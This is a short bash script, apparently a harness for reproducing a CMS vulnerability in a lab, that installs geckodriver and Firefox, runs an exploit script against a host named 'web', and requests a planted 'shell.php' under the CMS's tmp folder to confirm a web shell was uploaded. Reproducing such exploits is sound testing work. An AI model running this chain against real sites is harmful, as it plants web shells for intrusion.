#!/bin/bash
# install geckodriver
tar -xvzf /opt/poc/geckodriver-v0.26.0-linux64.tar.gz 
chmod +x geckodriver 
cp geckodriver /usr/local/bin/ 
# install firefox
tar -C /tmp -xjf /opt/config/firefox-81.0.2.tar.bz2 
mv /tmp/firefox /opt/firefox-81.0.2 
ln -fs /opt/firefox-81.0.2/firefox /usr/bin/firefox 
firefox --version

sleep 10
python3 /opt/poc/exp.py http://web

curl http://web/bl-content/tmp/shell.php
echo "poc ok"